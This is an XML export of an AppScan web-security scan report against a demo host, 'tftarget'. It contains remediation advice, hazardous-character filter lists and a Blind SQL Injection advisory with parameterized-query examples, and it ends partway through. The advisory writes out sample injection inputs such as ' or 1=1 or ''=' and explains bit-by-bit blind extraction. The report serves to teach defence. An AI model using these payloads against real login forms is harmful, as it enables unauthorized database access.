<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<XmlReport Name="tfdemoscan" XmlExportVersion="2.0">
  <AppScanInfo>
    <Version>7.8.0.891</Version>
    <ServicePack />
  </AppScanInfo>
  <Summary>
    <TotalIssues>45</TotalIssues>
    <TotalVariants>93</TotalVariants>
    <TotalRemediations>36</TotalRemediations>
    <TotalScanDuration>00:04:56.4085600</TotalScanDuration>
    <Hosts>
      <Host Name="http://tftarget/">
        <TotalInformationalIssues>5</TotalInformationalIssues>
        <TotalLowSeverityIssues>21</TotalLowSeverityIssues>
        <TotalMediumSeverityIssues>9</TotalMediumSeverityIssues>
        <TotalHighSeverityIssues>10</TotalHighSeverityIssues>
        <Total>45</Total>
      </Host>
    </Hosts>
  </Summary>
  <Results>
    <RemediationTypes>
      <Total>12</Total>
      <RemediationType ID="fix_50160">
        <Name>Ensure that accessed files reside in the virtual path and have certain extensions; remove special characters from user input</Name>
        <Priority>High</Priority>
        <fixRecommendation type="General">
          <li value="1">
            <text> Ensure that the requested file resides in the virtual path of the web server. </text>
          </li>
          <br />
          <li value="2">
            <text> Make sure that only certain extensions can be opened </text>
          </li>
          <br />
          <li value="3">
            <text> Remove special characters (Meta-characters) from the user's input, e.g. the pipe ("|") character. </text>
          </li>
          <br />
          <li value="4">
            <text> Use 'explicit open' mode for files in Perl CGI Scripts. </text>
          </li>
          <br />
        </fixRecommendation>
      </RemediationType>
      <RemediationType ID="fix_52000">
        <Name>Filter out hazardous characters from user input</Name>
        <Priority>High</Priority>
        <fixRecommendation type="General">
          <text>There are several issues whose remediation lies in sanitizing user input.</text>
          <br />
          <text>By verifying that user input does not contain hazardous characters, it is possible to prevent malicious users from causing your application to execute unintended operations, such as launch arbitrary SQL queries, embed Javascript code to be executed on the client side, run various operating system commands etc.</text>
          <br />
          <br />
          <text>It is advised to filter out all the following characters:</text>
          <br />
          <text>   [1] |  (pipe sign)</text>
          <br />
          <text>   [2] &amp;  (ampersand sign)</text>
          <br />
          <text>   [3] ;  (semicolon sign)</text>
          <br />
          <text>   [4] $  (dollar sign)</text>
          <br />
          <text>   [5] %  (percent sign)</text>
          <br />
          <text>   [6] @  (at sign)</text>
          <br />
          <text>   [7] '  (single apostrophe)</text>
          <br />
          <text>   [8] "  (quotation mark)</text>
          <br />
          <text>   [9] \' (backslash-escaped apostrophe)</text>
          <br />
          <text>   [10] \" (backslash-escaped quotation mark)</text>
          <br />
          <text>   [11] &lt;&gt; (triangular parenthesis)</text>
          <br />
          <text>   [12] () (parenthesis)</text>
          <br />
          <text>   [13] +  (plus sign)</text>
          <br />
          <text>   [14] CR (Carriage return, ASCII 0x0d)</text>
          <br />
          <text>   [15] LF (Line feed, ASCII 0x0a)</text>
          <br />
          <text>   [16] ,  (comma sign)</text>
          <br />
          <text>   [17] \  (backslash)</text>
          <br />
          <br />
          <br />
          <text>The following sections describe the various issues, their fix recommendations and the hazardous characters that might trigger these issues:</text>
          <br />
          <br />
          <br />
          <text>SQL injection and blind SQL injection:</text>
          <br />
          <text>A. Make sure the value and type (such as Integer, Date, etc.) of the user input is valid and expected by the application.</text>
          <br />
          <text>B. Use stored procedures to abstract data access so that users do not directly access tables or views. When using stored procedures, use the ADO command object to implement them, so that variables are strongly typed.</text>
          <br />
          <text>C. Sanitize input to exclude context-changing symbols such as:</text>
          <br />
          <text>   [1] '  (single apostrophe)</text>
          <br />
          <text>   [2] "  (quotation mark)</text>
          <br />
          <text>   [3] \' (backslash-escaped apostrophe)</text>
          <br />
          <text>   [4] \" (backslash-escaped quotation mark)</text>
          <br />
          <text>   [5] )  (closing parenthesis)</text>
          <br />
          <text>   [6] ;  (semicolon)</text>
          <br />
          <br />
          <br />
          <text>Cross site scripting:</text>
          <br />
          <text>A. Sanitize user input and filter out JavaScript code. We suggest that you filter the following characters:</text>
          <br />
          <text>   [1] &lt;&gt; (triangular parenthesis)</text>
          <br />
          <text>   [2] "  (quotation mark)</text>
          <br />
          <text>   [3] '  (single apostrophe)</text>
          <br />
          <text>   [4] %  (percent sign)</text>
          <br />
          <text>   [5] ;  (semicolon)</text>
          <br />
          <text>   [6] () (parenthesis)</text>
          <br />
          <text>   [7] &amp;  (ampersand sign)</text>
          <br />
          <text>   [8] +  (plus sign)</text>
          <br />
          <text>B. To fix the &lt;%00script&gt; variant see MS article 821349</text>
          <br />
          <text>C. For UTF-7 attacks:</text>
          <br />
          <text>   [-] When possible, it is recommended to enforce a specific charset encoding (using 'Content-Type' header or &lt;meta&gt; tag).</text>
          <br />
          <br />
          <text>HTTP response splitting:</text>
          <br />
          <text>Sanitize user input (at least, such input that is later embedded in HTTP responses).</text>
          <br />
          <text>Make sure that malicious characters are not part of the input, such as:</text>
          <br />
          <text>   [1] CR (Carriage return, ASCII 0x0d)</text>
          <br />
          <text>   [2] LF (Line feed, ASCII 0x0a)</text>
          <br />
          <br />
          <br />
          <text>Remote command execution:</text>
          <br />
          <text>Sanitize input to exclude symbols that are meaningful to the operating system's command execution, such as:</text>
          <br />
          <text>    [1] |  (pipe sign)</text>
          <br />
          <text>    [2] &amp;  (ampersand sign)</text>
          <br />
          <text>    [3] ;  (semicolon sign)</text>
          <br />
          <text>
          </text>
          <br />
          <br />
          <text>Shell command execution:</text>
          <br />
          <text>A. Never pass unchecked user-input to Perl commands such as: eval(), open(), sysopen(), system().</text>
          <br />
          <text>B. Make sure malicious characters are not part of the input, such as:</text>
          <br />
          <text>    [1] $  (dollar sign)</text>
          <br />
          <text>    [2] %  (percent sign)</text>
          <br />
          <text>    [3] @  (at sign)</text>
          <br />
          <br />
          <br />
          <text>XPath injection:</text>
          <br />
          <text>Sanitize input to exclude context changing symbols such as:</text>
          <br />
          <text>   [1] '  (single apostrophe)</text>
          <br />
          <text>   [2] "  (quotation mark)</text>
          <br />
          <text>   Etc.</text>
          <br />
          <text>
          </text>
          <br />
          <br />
          <text>LDAP injection:</text>
          <br />
          <text>A. Use positive validation. Alphanumeric filtering (A..Z,a..z,0..9)  is suitable for most LDAP queries.</text>
          <br />
          <text>B. Special LDAP characters which should be filtered out or escaped:</text>
          <br />
          <text>   [1] A space or "#" character at the beginning of the string </text>
          <br />
          <text>   [2] A space character at the end of the string </text>
          <br />
          <text>   [3] ,   (comma sign)</text>
          <br />
          <text>   [4] +   (plus sign)</text>
          <br />
          <text>   [5] "   (quotation mark)</text>
          <br />
          <text>   [6] \   (backslash)</text>
          <br />
          <text>   [7] &lt;&gt;  (triangular parenthesis)</text>
          <br />
          <text>   [8] ;   (semicolon sign)</text>
          <br />
          <text>   [9] ()  (parenthesis)</text>
          <br />
          <br />
          <br />
          <text>MX Injection: </text>
          <br />
          <text>Special MX characters should be filtered out: </text>
          <br />
          <text>   [1] CR (Carriage return, ASCII 0x0d)</text>
          <br />
          <text>   [2] LF (Line feed, ASCII 0x0a)</text>
          <br />
          <br />
          <text>Log Forging: </text>
          <br />
          <text>Special logging characters should be filtered out: </text>
          <br />
          <text>   [1] CR (Carriage return, ASCII 0x0d)</text>
          <br />
          <text>   [2] LF (Line feed, ASCII 0x0a)</text>
          <br />
          <text>   [3] BS (Backspace, ASCII 0x08)</text>
          <br />
          <br />
          <text>ORM Injection: </text>
          <br />
          <text>A. Make sure the value and type (such as Integer, Date, etc.) of the user input are valid and expected by the application.</text>
          <br />
          <text>B. Use stored procedures to abstract data access so that users do not directly access tables or views.</text>
          <br />
          <text>C. Use a parameterized queries API</text>
          <br />
          <text>D. Sanitize input to exclude context-changing symbols such as (*):</text>
          <br />
          <text>   [1] ' (single apostrophe)</text>
          <br />
          <text>   [2] " (quotation mark)</text>
          <br />
          <text>   [3] \' (backslash-escaped apostrophe)</text>
          <br />
          <text>   [4] \" (backslash-escaped quotation mark)</text>
          <br />
          <text>   [5] ) (closing parenthesis)</text>
          <br />
          <text>   [6] ; (semicolon)</text>
          <br />
          <text>
          </text>
          <br />
          <text>   (*) This applies to SQL. High level query languages may need a different sanitization mechanism.</text>
          <br />
        </fixRecommendation>
      </RemediationType>
      <RemediationType ID="fix_50040">
        <Name>Modify the server configuration to deny directory listing, and install the latest security patches available</Name>
        <Priority>Medium</Priority>
        <fixRecommendation type="General">
          <li value="1">
            <text> Configure the web server to deny listing of directories. </text>
          </li>
          <br />
          <li value="2">
            <text> Download a specific security patch according to the issue existing on your web server or web application. Some of the known directory listing issues are listed in the "References" field of this advisory. </text>
          </li>
          <br />
          <li value="3">
            <text> A Workaround from the "CERT" advisory found in the "References" field of this advisory, to fix the short filenames (8.3 DOS format) problem: </text>
          </li>
          <br />
          <text>a. Use only 8.3-compliant short file names for the files that you want to have protected solely by the web server. On FAT file systems (16-bit) this can be enforced by enabling (setting to 1) the "Win31FileSystem" registry key (registry path: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\FileSystem\).</text>
          <br />
          <text>b. On NTFS (32-bit), you can disable the creation of the 8.3-compliant short file name for files with long file names by enabling (setting to 1) the "NtfsDisable8dot3NameCreation" registry key (registry path: HKEY_LOCAL_MACHINE\System\ CurrentControlSet\Control\FileSystem\). However, this step may cause compatibility problems with 16-bit applications.</text>
          <br />
          <text>c. Use NTFS-based ACLs (directory or file level access control lists) to augment or replace web server-based security.</text>
          <br />
        </fixRecommendation>
      </RemediationType>
      <RemediationType ID="fix_50050">
        <Name>Remove old versions of files from the virtual directory</Name>
        <Priority>Medium</Priority>
        <fixRecommendation type="General">
          <text>Do not keep backup/temporary versions of files underneath the virtual web server root. This usually happens when editing these files "in place" by editors. Instead, when updating the site, move or copy the files to a directory outside the virtual root, edit them there, and move (or copy) the files back to the virtual root. Make sure that only the files that are actually in use reside under the virtual root.</text>
          <br />
        </fixRecommendation>
      </RemediationType>
      <RemediationType ID="fix_52230">
        <Name>Set proper access permissions to the Web.config files</Name>
        <Priority>Medium</Priority>
        <fixRecommendation type="General">
          <li value="1">
            <text> Set proper permissions or ACLs to the Web.config files which reside in your web site. </text>
          </li>
          <br />
          <li value="2">
            <text> Delete obsolete Web.config files from your web site. </text>
          </li>
          <br />
        </fixRecommendation>
      </RemediationType>
      <RemediationType ID="fix_54860">
        <Name>Apply proper authorization to administration scripts</Name>
        <Priority>Low</Priority>
        <fixRecommendation type="General">
          <text>Do not allow access to administration scripts without proper authorization, as it may allow an attacker to gain privileged rights.</text>
          <br />
        </fixRecommendation>
      </RemediationType>
      <RemediationType ID="fix_60510">
        <Name>Download the relevant security patch for your web server or web application.</Name>
        <Priority>Low</Priority>
        <fixRecommendation type="General">
          <text>Download the relevant security patch depending on the issue existing on your web server or web application.</text>
          <br />
        </fixRecommendation>
      </RemediationType>
      <RemediationType ID="fix_50330">
        <Name>Issue a "404 - Not Found" response status code for a forbidden resource, or remove it completely</Name>
        <Priority>Low</Priority>
        <fixRecommendation type="General">
          <text>If the forbidden resource is not required, remove it from the site.</text>
          <br />
          <text>If possible, issue a "404 - Not Found" response status code instead of "403 - Forbidden". This change will obfuscate the presence of the directory in the site, and will prevent the site structure from being exposed.</text>
          <br />
        </fixRecommendation>
      </RemediationType>
      <RemediationType ID="fix_59167">
        <Name>Remove internal IP addresses from your website</Name>
        <Priority>Low</Priority>
        <fixRecommendation type="General">
          <text>Internal IP is usually exposed in error messages produced by the web-application/server or in HTML/JavaScript comments.</text>
          <br />
          <br />
          <li value="1">
            <text> Turn off problematic detailed error messages in the web-application/server. </text>
          </li>
          <br />
          <li value="2">
            <text> Make sure relevant patches are installed. </text>
          </li>
          <br />
          <li value="3">
            <text> Make sure that Internal IP information is not left in HTML/JavaScript comments. </text>
          </li>
          <br />
        </fixRecommendation>
      </RemediationType>
      <RemediationType ID="fix_50750">
        <Name>Remove sensitive information from HTML comments</Name>
        <Priority>Low</Priority>
        <fixRecommendation type="General">
          <li value="1">
            <text> Do not leave any vital information such as filenames or file paths in HTML comments. </text>
          </li>
          <br />
          <li value="2">
            <text> Remove traces of previous (or future) site links in the production site comments. </text>
          </li>
          <br />
          <li value="3">
            <text> Avoid placing sensitive information in HTML comments. </text>
          </li>
          <br />
          <li value="4">
            <text> Make sure that HTML comments do not include source code fragments. </text>
          </li>
          <br />
          <li value="5">
            <text> Make sure that no vital information was left behind by programmers. </text>
          </li>
          <br />
        </fixRecommendation>
      </RemediationType>
      <RemediationType ID="fix_54850">
        <Name>Remove test scripts from the server</Name>
        <Priority>Low</Priority>
        <fixRecommendation type="General">
          <text>Do not leave test/temporary scripts on the server and avoid doing so in the future.</text>
          <br />
          <text>Make sure there are no other scripts on the server that are not essential for its normal operation.</text>
          <br />
        </fixRecommendation>
      </RemediationType>
      <RemediationType ID="fix_50300">
        <Name>Verify that parameter values are in their expected ranges and types. Do not output debugging error messages and exceptions</Name>
        <Priority>Low</Priority>
        <fixRecommendation type="General">
          <li value="1">
            <text> Check incoming requests for the presence of all expected parameters and values. When a parameter is missing, issue a proper error message or use default values. </text>
          </li>
          <br />
          <li value="2">
            <text> The application should verify that its input consists of valid characters (after decoding). For example, an input value containing the null byte (encoded as %00), apostrophe, quotes, etc. should be rejected. </text>
          </li>
          <br />
          <li value="3">
            <text> Enforce values in their expected ranges and types. If your application expects a certain parameter to have a value from a certain set, then the application should ensure that the value it receives indeed belongs to the set. For example, if your application expects a value in the range 10..99, then it should make sure that the value is indeed numeric, and that its value is in 10..99. </text>
          </li>
          <br />
          <li value="4">
            <text> Verify that the data belongs to the set offered to the client. </text>
          </li>
          <br />
          <li value="5">
            <text> Do not output debugging error messages and exceptions in a production environment. </text>
          </li>
          <br />
        </fixRecommendation>
      </RemediationType>
    </RemediationTypes>
    <IssueTypes>
      <Total>18</Total>
      <IssueType ID="attBlindSqlInjectionStrings" Count="2">
        <RemediationID>fix_52000</RemediationID>
        <advisory>
          <name>Blind SQL Injection</name>
          <testDescription>Application-level test</testDescription>
          <threatClassification>
            <name>Command Execution: SQL Injection</name>
            <reference>http://www.webappsec.org/projects/threat/classes/sql_injection.shtml</reference>
          </threatClassification>
          <testTechnicalDescription>
            <text>Web applications often use databases at the backend to interact with the enterprise data warehouse. The de-facto standard language for querying databases is SQL (each major database vendor has its own dialect). Web applications often take user input (taken out of the HTTP request) and incorporate it in an SQL query, which is then sent to the backend database. The query results are then processed by the application and sometimes displayed to the user.</text>
            <br />
            <br />
            <text>This mode of operation can be exploited by an attacker if the application is not careful enough with its treatment of user (attacker) input. If this is the case, an attacker can inject malicious data, which when incorporated into an SQL query, changes the original syntax of the query into something completely different. For example, if an application uses user's input (such as username and password) to query a database table of users' accounts in order to authenticate the user, and the attacker has the ability to inject malicious data into the username part of the query (or the password part, or both), the query can be changed into a different data yanking query, a query that modifies the database, or a query that runs shell commands on the database server.</text>
            <br />
            <br />
            <text>Typically, the attacker achieves this goal in steps. He/she will first learn the structure of the SQL query, and then use this knowledge to thwart the query (by injecting data that changes the query syntax) into performing differently than intended. Suppose the query in question is:</text>
            <br />
            <br />
            <indentText> SELECT COUNT(*) FROM accounts WHERE username='$user' AND password='$pass'</indentText>
            <br />
            <text>Where $user and $pass are user input (collected from the HTTP request which invoked the script that constructs the query - either from a GET request query parameters, or from a POST request body parameters). A regular usage of this query would be with values $user=john, $password=secret123. The query formed would be:</text>
            <br />
            <br />
            <indentText> SELECT COUNT(*) FROM accounts WHERE username='john' AND password='secret123'</indentText>
            <br />
            <text>The expected query result is 0 if no such user+password pair exists in the database, and &gt;0 if such pair exists (i.e. there is a user named 'john' in the database, whose password is 'secret123'). This would serve as a basic authentication mechanism for the application. But an attacker can alter this query in the following way:</text>
            <br />
            <br />
            <text>By providing an input consisting of a single apostrophe character ('), the attacker can cause the database to emit an error message, which usually contains valuable information regarding the SQL query. The attack would simply involve sending a request with the user value ' and a password with any value (e.g. foobar). The result would be the following (malformed) SQL query:</text>
            <br />
            <br />
            <indentText> SELECT COUNT(*) FROM accounts WHERE username=''' AND password='foobar'</indentText>
            <br />
            <text>This may yield the following error message (depending on the specific database in use at the backend):</text>
            <br />
            <br />
            <indentText> Syntax error (missing operator) in query expression 'username = ''' AND password = 'foobar''.</indentText>
            <br />
            <text>The attacker is informed that the query is built around the expression username='$user' AND password='$pass'. This crucial information is needed to exploit the SQL query at hand. When the attacker understands the format of the query, his next step would simply be to use:</text>
            <br />
            <br />
            <indentText> user = ' or 1=1 or ''='</indentText>
            <indentText> password = foobar</indentText>
            <br />
            <text>The resulting query is: </text>
            <br />
            <br />
            <indentText> SELECT COUNT(*) FROM accounts WHERE username='' or 1=1 or ''='' AND password='foobar'</indentText>
            <br />
            <text>This means that the query (in the SQL database) will return TRUE for every record of the table "accounts", since the expression 1=1 is always true. Therefore, the query will return the number of records in "accounts", and thus the user (attacker) will be considered valid. There are several variants of this probing method, such as sending ';  or \' (it should be remembered that almost all vendors have their own unique SQL 'dialect'). Specifically sending ' having 1=1 is also known to produce error messages that reveal information about column names. In some cases, the user input is not incorporated in a string context (encompassed in apostrophes), but rather in numeric context, that is, embedded as-is. Thus the input string 1 having 1=1 can be used in such cases.</text>
            <br />
            <br />
            <br />
            <text>* Blind SQL injection techniques:</text>
            <br />
            <br />
            <text>A common way to reduce the risk of being attacked by SQL injection is to supress detailed SQL error messages, which are usually used by attackers (as explained in the examples above) to easily locate scripts that are susceptible to SQL Injection.</text>
            <br />
            <text>This (security through obscurity) solution can be bypassed by using a technique called "Blind SQL injection", in which the hacker locates scripts, which are susceptible to SQL injection, without having to depend on the returning SQL error messages.</text>
            <br />
            <br />
            <text>The technique calls for sending requests whose vulnerable parameter (the parameter that gets embedded in the SQL query) is modified in such way that the response indicates whether the data is used in SQL query context or not. The modification involves the use of an AND boolean expression with the original string, which evaluates once as true and once as false. In one case, the net result should be identical to the original result (e.g. a successful login), and in the other case, the result should be different (e.g. failed login). An OR expression which evaluates as true may also be useful for some rare cases.</text>
            <br />
            <br />
            <text>If the original data is numeric, then a simpler trick can be played. The original data (say, 123) can be replaced with 0+123 in one request, and with 456+123 in another. The result of the first request should be identical to the original result, whereas the result of the second request should be different (as the number is evaluated as 579). For some cases, we still need a version of the attack described above (using AND and OR), but without escaping from string context.</text>
            <br />
            <br />
            <text>The concept behind blind SQL injection is that it is possible, even without receiving direct data from the database (in the form of an error message, or leaked information), to extract data from the database, one bit at a time, or to modify the query in a malicious way. The idea is that the application behavior (result identical to the original result, or result different than the original result) can provide a single bit of information about the evaluated (modified) query, meaning, it's possible for the attacker to formulate an SQL Boolean expression whose evaluation (single bit) is compromised in the form of the application behavior (identical/un-identical to the original behavior).</text>
            <br />
          </testTechnicalDescription>
          <causes>
            <cause>Sanitation of hazardous characters was not performed correctly on user input</cause>
          </causes>
          <securityRisks>
            <securityRisk>It is possible to view, modify or delete database entries and tables</securityRisk>
          </securityRisks>
          <affectedProducts>
            <affectedProduct>This issue may affect different types of products.</affectedProduct>
          </affectedProducts>
          <references>
            <link target="http://www.ngssoftware.com/papers/webappdis.doc">"Web Application Disassembly with ODBC Error Messages" (By David Litchfield)</link>
            <link target="http://shh.thathost.com/text/binary-search-sql-injection.txt">"Using Binary Search with SQL Injection" (By Sverre H. Huseby)</link>
            <link target="http://download.boulder.ibm.com/ibmdl/pub/software/dw/richmedia/rational/08/appscan_demos/blindsqlinjection/viewer.swf#recorded_advisory">Blind SQL Injection Training Module</link>
            <link target="http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=89">CWE-89: Failure to Preserve SQL Query Structure ('SQL Injection')</link>
          </references>
          <fixRecommendations>
            <fixRecommendation type="General">
              <text>There are several issues whose remediation lies in sanitizing user input.</text>
              <br />
              <text>By verifying that user input does not contain hazardous characters, it is possible to prevent malicious users from causing your application to execute unintended operations, such as launch arbitrary SQL queries, embed Javascript code to be executed on the client side, run various operating system commands etc.</text>
              <br />
              <br />
              <text>It is advised to filter out all the following characters:</text>
              <br />
              <indentText>   [1] |  (pipe sign)</indentText>
              <indentText>   [2] &amp;  (ampersand sign)</indentText>
              <indentText>   [3] ;  (semicolon sign)</indentText>
              <indentText>   [4] $  (dollar sign)</indentText>
              <indentText>   [5] %  (percent sign)</indentText>
              <indentText>   [6] @  (at sign)</indentText>
              <indentText>   [7] '  (single apostrophe)</indentText>
              <indentText>   [8] "  (quotation mark)</indentText>
              <indentText>   [9] \' (backslash-escaped apostrophe)</indentText>
              <indentText>   [10] \" (backslash-escaped quotation mark)</indentText>
              <indentText>   [11] &lt;&gt; (triangular parenthesis)</indentText>
              <indentText>   [12] () (parenthesis)</indentText>
              <indentText>   [13] +  (plus sign)</indentText>
              <indentText>   [14] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [15] LF (Line feed, ASCII 0x0a)</indentText>
              <indentText>   [16] ,  (comma sign)</indentText>
              <indentText>   [17] \  (backslash)</indentText>
              <br />
              <br />
              <text>The following sections describe the various issues, their fix recommendations and the hazardous characters that might trigger these issues:</text>
              <br />
              <br />
              <br />
              <text>SQL injection and blind SQL injection:</text>
              <br />
              <text>A. Make sure the value and type (such as Integer, Date, etc.) of the user input is valid and expected by the application.</text>
              <br />
              <text>B. Use stored procedures to abstract data access so that users do not directly access tables or views. When using stored procedures, use the ADO command object to implement them, so that variables are strongly typed.</text>
              <br />
              <text>C. Sanitize input to exclude context-changing symbols such as:</text>
              <br />
              <indentText>   [1] '  (single apostrophe)</indentText>
              <indentText>   [2] "  (quotation mark)</indentText>
              <indentText>   [3] \' (backslash-escaped apostrophe)</indentText>
              <indentText>   [4] \" (backslash-escaped quotation mark)</indentText>
              <indentText>   [5] )  (closing parenthesis)</indentText>
              <indentText>   [6] ;  (semicolon)</indentText>
              <br />
              <br />
              <text>Cross site scripting:</text>
              <br />
              <text>A. Sanitize user input and filter out JavaScript code. We suggest that you filter the following characters:</text>
              <br />
              <indentText>   [1] &lt;&gt; (triangular parenthesis)</indentText>
              <indentText>   [2] "  (quotation mark)</indentText>
              <indentText>   [3] '  (single apostrophe)</indentText>
              <indentText>   [4] %  (percent sign)</indentText>
              <indentText>   [5] ;  (semicolon)</indentText>
              <indentText>   [6] () (parenthesis)</indentText>
              <indentText>   [7] &amp;  (ampersand sign)</indentText>
              <indentText>   [8] +  (plus sign)</indentText>
              <text>B. To fix the &lt;%00script&gt; variant see MS article 821349</text>
              <br />
              <text>C. For UTF-7 attacks:</text>
              <br />
              <indentText>   [-] When possible, it is recommended to enforce a specific charset encoding (using 'Content-Type' header or &lt;meta&gt; tag).</indentText>
              <br />
              <text>HTTP response splitting:</text>
              <br />
              <text>Sanitize user input (at least, such input that is later embedded in HTTP responses).</text>
              <br />
              <text>Make sure that malicious characters are not part of the input, such as:</text>
              <br />
              <indentText>   [1] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [2] LF (Line feed, ASCII 0x0a)</indentText>
              <br />
              <br />
              <text>Remote command execution:</text>
              <br />
              <text>Sanitize input to exclude symbols that are meaningful to the operating system's command execution, such as:</text>
              <br />
              <indentText>    [1] |  (pipe sign)</indentText>
              <indentText>    [2] &amp;  (ampersand sign)</indentText>
              <indentText>    [3] ;  (semicolon sign)</indentText>
              <indentText>   </indentText>
              <br />
              <text>Shell command execution:</text>
              <br />
              <text>A. Never pass unchecked user-input to Perl commands such as: eval(), open(), sysopen(), system().</text>
              <br />
              <text>B. Make sure malicious characters are not part of the input, such as:</text>
              <br />
              <indentText>    [1] $  (dollar sign)</indentText>
              <indentText>    [2] %  (percent sign)</indentText>
              <indentText>    [3] @  (at sign)</indentText>
              <br />
              <br />
              <text>XPath injection:</text>
              <br />
              <text>Sanitize input to exclude context changing symbols such as:</text>
              <br />
              <indentText>   [1] '  (single apostrophe)</indentText>
              <indentText>   [2] "  (quotation mark)</indentText>
              <indentText>   Etc.</indentText>
              <indentText>   </indentText>
              <br />
              <text>LDAP injection:</text>
              <br />
              <text>A. Use positive validation. Alphanumeric filtering (A..Z,a..z,0..9)  is suitable for most LDAP queries.</text>
              <br />
              <text>B. Special LDAP characters which should be filtered out or escaped:</text>
              <br />
              <indentText>   [1] A space or "#" character at the beginning of the string </indentText>
              <indentText>   [2] A space character at the end of the string </indentText>
              <indentText>   [3] ,   (comma sign)</indentText>
              <indentText>   [4] +   (plus sign)</indentText>
              <indentText>   [5] "   (quotation mark)</indentText>
              <indentText>   [6] \   (backslash)</indentText>
              <indentText>   [7] &lt;&gt;  (triangular parenthesis)</indentText>
              <indentText>   [8] ;   (semicolon sign)</indentText>
              <indentText>   [9] ()  (parenthesis)</indentText>
              <br />
              <br />
              <text>MX Injection: </text>
              <br />
              <text>Special MX characters should be filtered out: </text>
              <br />
              <indentText>   [1] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [2] LF (Line feed, ASCII 0x0a)</indentText>
              <br />
              <text>Log Forging: </text>
              <br />
              <text>Special logging characters should be filtered out: </text>
              <br />
              <indentText>   [1] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [2] LF (Line feed, ASCII 0x0a)</indentText>
              <indentText>   [3] BS (Backspace, ASCII 0x08)</indentText>
              <br />
              <text>ORM Injection: </text>
              <br />
              <text>A. Make sure the value and type (such as Integer, Date, etc.) of the user input are valid and expected by the application.</text>
              <br />
              <text>B. Use stored procedures to abstract data access so that users do not directly access tables or views.</text>
              <br />
              <text>C. Use a parameterized queries API</text>
              <br />
              <text>D. Sanitize input to exclude context-changing symbols such as (*):</text>
              <br />
              <indentText>   [1] ' (single apostrophe)</indentText>
              <indentText>   [2] " (quotation mark)</indentText>
              <indentText>   [3] \' (backslash-escaped apostrophe)</indentText>
              <indentText>   [4] \" (backslash-escaped quotation mark)</indentText>
              <indentText>   [5] ) (closing parenthesis)</indentText>
              <indentText>   [6] ; (semicolon)</indentText>
              <indentText> </indentText>
              <indentText>   (*) This applies to SQL. High level query languages may need a different sanitization mechanism.</indentText>
            </fixRecommendation>
            <fixRecommendation type="ASP.NET">
              <text>Here are two possible ways to protect your web application against SQL injection attacks:</text>
              <br />
              <br />
              <text>[1] Use a stored procedure rather than dynamically built SQL query string. The way parameters are passed to SQL Server stored procedures, prevents the use of apostrophes and hyphens.</text>
              <br />
              <br />
              <text>Here is a simple example of how to use stored procedures in ASP.NET:</text>
              <br />
              <br />
              <code>  ' Visual Basic example
  Dim DS As DataSet
  Dim MyConnection As SqlConnection
  Dim MyCommand As SqlDataAdapter
  Dim SelectCommand As String = "select * from users where username = @username"
  ...
  MyCommand.SelectCommand.Parameters.Add(New SqlParameter("@username", SqlDbType.NVarChar, 20))
  MyCommand.SelectCommand.Parameters("@username").Value = UserNameField.Value
  // C# example
  String selectCmd = "select * from Authors where state = @username";
  SqlConnection myConnection = new SqlConnection("server=...");
  SqlDataAdapter myCommand = new SqlDataAdapter(selectCmd, myConnection);
  myCommand.SelectCommand.Parameters.Add(new SqlParameter("@username", SqlDbType.NVarChar, 20));
  myCommand.SelectCommand.Parameters["@username"].Value = UserNameField.Value;
</code>
              <br />
              <br />
              <text>[2] You can add input validation to Web Forms pages by using validation controls. Validation controls provide an easy-to-use mechanism for all common types of standard validation - for example, testing for valid dates or values within a range - plus ways to provide custom-written validation. In addition, validation controls allow you to completely customize how error information is displayed to the user. Validation controls can be used with any controls that are processed in a Web Forms page's class file, including both HTML and Web server controls.</text>
              <br />
              <br />
              <text>In order to make sure user input contains only valid values, you can use one of the following validation controls:</text>
              <br />
              <br />
              <indentText> a. "RangeValidator": checks that a user's entry (value) is between specified lower and upper boundaries. You can check ranges within pairs of numbers, alphabetic characters, and dates.</indentText>
              <br />
              <indentText> b. "RegularExpressionValidator": checks that the entry matches a pattern defined by a regular expression. This type of validation allows you to check for predictable sequences of characters, such as those in social security numbers, e-mail addresses, telephone numbers, postal codes, and so on.</indentText>
              <br />
              <text>Important note: validation controls do not block user input or change the flow of page processing; they only set an error state, and produce error messages. It is the programmer's responsibility to test the state of the controls in the code before performing further application-specific actions.</text>
              <br />
              <br />
              <text>There are two ways to check for user input validity: </text>
              <br />
              <br />
              <text>1. Testing for a general error state: </text>
              <br />
              <br />
              <text>In your code, test the page's IsValid property. This property rolls up the values of the IsValid properties of all the validation controls on the page (using a logical AND). If one of the validation controls is set to invalid, the page's property will return false.</text>
              <br />
              <br />
              <text>2. Testing for the error state of individual controls:</text>
              <br />
              <br />
              <text>Loop through the page's Validators collection, which contains references to all the validation controls. You can then examine the IsValid property of each validation control.</text>
            </fixRecommendation>
            <fixRecommendation type="J2EE">
              <text>** Prepared Statements:</text>
              <br />
              <br />
              <text>There are 3 possible ways to protect your application against SQL injection, i.e. malicious tampering of SQL parameters.  Instead of dynamically building SQL statements, use:</text>
              <br />
              <br />
              <text>[1] PreparedStatement, which is precompiled and stored in a pool of PreparedStatement objects.  PreparedStatement defines setters to register input parameters that are compatible with the supported JDBC SQL data types.  For example, setString should be used for input parameters of type VARCHAR or LONGVARCHAR (refer to the Java API for further details).  This way of setting input parameters prevents an attacker from manipulating the SQL statement through injection of bad characters, such as apostrophe.</text>
              <br />
              <br />
              <text>Example of how to use a PreparedStatement in J2EE:</text>
              <br />
              <br />
              <code>  // J2EE PreparedStatemenet Example
  // Get a connection to the database
  Connection myConnection;
  if (isDataSourceEnabled()) {
      // using the DataSource to get a managed connection
      Context ctx = new InitialContext();
      myConnection = ((DataSource)ctx.lookup(datasourceName)).getConnection(dbUserName, dbPassword);
  } else {
      try {
          // using the DriverManager to get a JDBC connection
          Class.forName(jdbcDriverClassPath);
          myConnection = DriverManager.getConnection(jdbcURL, dbUserName, dbPassword);
      } catch (ClassNotFoundException e) {
          ...
      }
  }
  ...
  try {
      PreparedStatement myStatement = myConnection.prepareStatement("select * from users where username = ?");
      myStatement.setString(1, userNameField);
      ResultSet rs = myStatement.executeQuery();
      ...
      rs.close();
  } catch (SQLException sqlException) {
      ...
  } finally {
      myStatement.close();
      myConnection.close();
  }
</code>
              <br />
              <br />
